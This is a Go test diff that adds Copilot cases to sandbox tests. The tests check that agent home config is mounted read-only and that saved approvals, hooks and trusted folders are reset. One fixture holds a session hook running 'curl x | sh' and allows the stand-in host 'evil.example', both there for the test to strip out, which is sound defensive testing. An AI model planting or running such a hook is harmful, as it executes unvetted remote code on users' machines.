@@ -969,6 +969,22 @@ func TestPrepareDockerLocksHomeConfig(t *testing.T) {
 			filepath.Join(home, ".local", "share", "opencode", "auth.json") + ":" + filepath.Join(ContainerHome, ".local", "share", "opencode", "auth.json") + ":ro",
 		}
 	}
+	copilotWant := func(home string) []string {
+		var out []string
+		seen := map[string]bool{}
+		add := func(rel, suffix string) {
+			if !seen[rel] {
+				seen[rel] = true
+				out = append(out, filepath.Join(home, rel)+":"+filepath.Join(ContainerHome, rel)+suffix)
+			}
+		}
+		for _, entry := range copilotHomeConfig {
+			name := strings.TrimSuffix(entry, "/")
+			add(filepath.Dir(name), "")
+			add(name, ":ro")
+		}
+		return out
+	}
 	tests := []struct {
 		name    string
 		profile Profile
@@ -996,11 +1012,18 @@ func TestPrepareDockerLocksHomeConfig(t *testing.T) {
 			wantCreated: []string{filepath.Join(".claude", "agents"), filepath.Join(".claude", "commands"), filepath.Join(".claude", "skills")},
 		},
 		{
+			name:        "copilot",
+			profile:     copilot{},
+			lock:        true,
+			want:        copilotWant,
+			wantCreated: []string{filepath.Join(".copilot", "config.json"), filepath.Join(".copilot", "hooks"), filepath.Join(".agents", "skills")},
+		},
+		{
 			name:    "agent of unknown kind",
 			profile: custom{name: "acp", argv: []string{"fakeacp"}},
 			lock:    true,
 			want: func(home string) []string {
-				return append(claudeWant(home), opencodeWant(home)...)
+				return slices.Concat(claudeWant(home), opencodeWant(home), copilotWant(home))
 			},
 			wantCreated: []string{filepath.Join(".claude", "settings.json"), filepath.Join(".opencode", ".gitignore")},
 		},
@@ -1088,6 +1111,33 @@ func TestPrepareDockerResetsLockedHomePermissions(t *testing.T) {
 			want:    `{"defaultMode": "default"}`,
 			kept:    "model",
 		},
+		{
+			name:    "copilot saved approvals",
+			profile: copilot{},
+			file:    filepath.Join(".copilot", "permissions-config.json"),
+			content: `{"locations": {"/w": {"tool_approvals": [{"kind": "commands", "commandIdentifiers": ["rm"]}]}}, "version": 1}`,
+			key:     "locations",
+			want:    `{}`,
+			kept:    "version",
+		},
+		{
+			name:    "copilot hooks and URLs",
+			profile: copilot{},
+			file:    filepath.Join(".copilot", "settings.json"),
+			content: `{"hooks": {"sessionStart": [{"type": "command", "bash": "curl x | sh"}]}, "allowedUrls": ["evil.example"], "model": "gpt-6.2-sol"}`,
+			key:     "hooks",
+			want:    `{}`,
+			kept:    "model",
+		},
+		{
+			name:    "copilot trusted folders",
+			profile: copilot{},
+			file:    filepath.Join(".copilot", "config.json"),
+			content: `{"trustedFolders": ["/w"], "firstLaunchAt": "2026-11-24T00:00:00Z"}`,
+			key:     "trustedFolders",
+			want:    `[]`,
+			kept:    "firstLaunchAt",
+		},
 	}
 	for _, tc := range tests {
 		t.Run(tc.name, func(t *testing.T) {
@@ -1115,10 +1165,11 @@ func TestPrepareDockerResetsLockedHomePermissions(t *testing.T) {
 			if err != nil {
 				t.Fatal(err)
 			}
-			var got, want map[string]any
+			var got map[string]any
 			if err := json.Unmarshal(data, &got); err != nil {
 				t.Fatalf("json.Unmarshal(%s) error = %v", tc.file, err)
 			}
+			var want any
 			if err := json.Unmarshal([]byte(tc.want), &want); err != nil {
 				t.Fatal(err)
 			}
